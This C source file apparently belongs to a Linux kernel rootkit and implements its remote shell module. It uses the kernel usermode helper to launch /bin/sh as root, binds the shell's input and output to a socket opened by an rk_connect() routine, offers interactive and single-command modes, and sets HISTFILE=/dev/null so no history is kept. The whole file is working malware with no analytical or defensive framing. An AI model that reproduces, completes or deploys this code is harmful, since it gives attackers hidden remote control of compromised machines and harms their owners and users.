// SPDX-License-Identifier: GPL-2.0
// execution/shell.c - Interactive and exec shells via usermodehelper.
#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

struct rk_shell {
	struct mutex		lock;
	bool			busy;
	struct socket		*sock;
	struct file		*file;
	struct delayed_work	timeout_work;
	unsigned long		timeout_jiffies;
	char			cmd[RK_CMD_MAX];
};

static struct rk_shell interactive_shell;
static struct rk_shell exec_shell;

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

static void rk_shell_timeout_fn(struct work_struct *work)
{
	struct rk_shell *shell = container_of(
		to_delayed_work(work), struct rk_shell, timeout_work);

	mutex_lock(&shell->lock);
	if (shell->busy && shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
}

static void rk_shell_init_one(struct rk_shell *shell)
{
	mutex_init(&shell->lock);
	shell->busy = false;
	shell->sock = NULL;
	shell->file = NULL;
	shell->timeout_jiffies = msecs_to_jiffies(shell_timeout_ms);
	shell->cmd[0] = '\0';
	INIT_DELAYED_WORK(&shell->timeout_work, rk_shell_timeout_fn);
}

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

static int rk_shell_init_fn(struct subprocess_info *info,
			     struct cred *new)
{
	struct rk_shell *shell = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!shell->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(shell->file, fd);
		if (error)
			return error;
	}
	return 0;
}

static int rk_shell_make_file(struct rk_shell *shell)
{
	struct file *file;

	file = sock_alloc_file(shell->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	shell->file = file;
	return 0;
}

static void rk_shell_release(struct rk_shell *shell)
{
	cancel_delayed_work_sync(&shell->timeout_work);

	if (shell->file) {
		fput(shell->file);
		shell->file = NULL;
		shell->sock = NULL;
	} else if (shell->sock) {
		sock_release(shell->sock);
		shell->sock = NULL;
	}
}

static int rk_shell_spawn(struct rk_shell *shell, char **argv)
{
	struct subprocess_info *sub;
	struct socket *sock;

	sock = rk_connect();
	if (IS_ERR(sock))
		return PTR_ERR(sock);
	shell->sock = sock;

	if (rk_shell_make_file(shell))
		return -EIO;

	mod_delayed_work(system_wq, &shell->timeout_work,
			 shell->timeout_jiffies);

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, shell);
	if (!sub)
		return -ENOMEM;

	call_usermodehelper_exec(sub, UMH_WAIT_PROC);
	return 0;
}

static void rk_interactive_work(struct work_struct *work)
{
	struct rk_shell *shell = &interactive_shell;
	char *argv[] = { "/bin/sh", "-i", NULL };

	rk_shell_spawn(shell, argv);

	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	mutex_unlock(&shell->lock);
}

static void rk_exec_work(struct work_struct *work)
{
	struct rk_shell *shell = &exec_shell;
	char *argv[] = { "/bin/sh", "-c", shell->cmd, NULL };

	rk_shell_spawn(shell, argv);

	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	shell->cmd[0] = '\0';
	mutex_unlock(&shell->lock);
}

static DECLARE_WORK(interactive_work_item, rk_interactive_work);
static DECLARE_WORK(exec_work_item, rk_exec_work);

static void rk_shell_stop(struct rk_shell *shell)
{
	mutex_lock(&shell->lock);
	if (shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
	cancel_delayed_work_sync(&shell->timeout_work);
}

void rk_shells_init(void)
{
	rk_shell_init_one(&interactive_shell);
	rk_shell_init_one(&exec_shell);
}

void rk_shells_cleanup(void)
{
	rk_shell_stop(&interactive_shell);
	rk_shell_stop(&exec_shell);
	cancel_work_sync(&interactive_work_item);
	cancel_work_sync(&exec_work_item);
}

int rk_start_interactive(void)
{
	int error = 0;

	mutex_lock(&interactive_shell.lock);
	if (interactive_shell.busy) {
		error = -EBUSY;
	} else {
		interactive_shell.busy = true;
		schedule_work(&interactive_work_item);
	}
	mutex_unlock(&interactive_shell.lock);
	return error;
}

int rk_start_exec(const char *cmd)
{
	size_t len;
	int error = 0;

	if (!cmd || !*cmd)
		return -EINVAL;
	len = strlen(cmd);
	if (len >= RK_CMD_MAX)
		return -E2BIG;

	mutex_lock(&exec_shell.lock);
	if (exec_shell.busy) {
		error = -EBUSY;
	} else {
		exec_shell.busy = true;
		memcpy(exec_shell.cmd, cmd, len + 1);
		schedule_work(&exec_work_item);
	}
	mutex_unlock(&exec_shell.lock);
	return error;
}
